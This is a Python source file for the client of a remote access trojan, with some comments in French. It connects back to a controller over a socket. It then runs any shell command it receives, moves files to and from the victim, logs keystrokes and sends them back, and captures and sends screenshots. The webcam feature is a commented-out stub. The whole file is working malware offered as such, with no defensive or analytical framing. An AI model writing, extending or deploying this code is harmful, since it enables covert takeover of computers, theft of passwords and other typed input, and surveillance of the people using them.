import socket
import os
import subprocess
import pynput
from pynput.keyboard import Key, Listener
import pyscreenshot as ImageGrab



BUFFER = 1024
s = socket.socket()
host = socket.gethostbyname(socket.gethostname()) #'192.168.1.98'
port = 5050

fn = ['upload', 'download', 'keylog', 'screenshot', 'webcam']

s.connect((host, port))


def upload():
    filename = s.recv(BUFFER)
    f = open(filename, 'rb')
    i = f.read(1024)

    while i:
        s.send(i)
        i = f.read(1024)

    f.close()
    s.send(b'Complete')


def download():
    # etre dans bon repertoire

    f = open(os.getcwd() + "\\" + data[7:].decode('utf-8'), 'wb')
    i = s.recv(BUFFER)

    while not ('Complete' in str(i)):
        f.write(i)
        i = s.recv(BUFFER)

    f.close()


count = 0
def on_press(key):
    global count

    k = str(key).replace("'", "")
    s.send(str.encode(k))
    count += 1



def on_release(key):
    global count

    if count == 10:
        s.send(str.encode("end"))
        count = 0
        return False


def keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def screenshot():
    im = ImageGrab.grab()
    im.save('im.png')

    f = open('im.png', 'rb')
    i = f.read(1024)

    while i:
        s.send(i)
        i = f.read(1024)

    f.close()
    s.send(b'Complete')
    os.system('del im.png')



def webcam():
    # vc = cv2.VideoCapture(0)
    # if vc.isOpened():
    # rval, frame = vc.read()
    # else:
    # rval = False
    # while rval:
    # pickle.dump(rval, )
    # send
    # rval, frame = vc.read()
    # if s.recv(1024).decode('utf-8') == 'end':
    # break

    pass

def chercher(c, fn):
    id = True
    for i in fn:

        if c == i:
            id = True
            break
        else:
            id = False
    return id


while True:

    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        try:
            os.chdir(data[3:].decode("utf-8"))
        except:
            s.send(str.encode("Directory not found...\n" + os.getcwd() + ">"))
            data = s.recv(1024)

    if data.decode("utf-8") == 'download':
        upload()
        data = s.recv(1024)
    if data[:6].decode("utf-8") == 'upload':
        download()
    if data.decode("utf-8") == 'keylog':
        keylogger()
        data = s.recv(1024)
    if data.decode("utf-8") == 'screenshot':
        screenshot()

        data = s.recv(1024)
    if data.decode("utf-8") == 'webcam':
        webcam()
        data = s.recv(1024)
    if data.decode("utf-8") == 'quit':
        break

    if len(data) > 0:

        cmd = subprocess.Popen(data[:].decode("utf-8"),
                               shell=True, stdout=subprocess.PIPE,
                               stdin=subprocess.PIPE,

                               stderr=subprocess.PIPE)

        indice = chercher(data.decode('utf-8'), fn)

        if indice == False:
            output_byte = cmd.stdout.read() + cmd.stderr.read()
        else:
            output_byte = cmd.stdout.read()

        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))
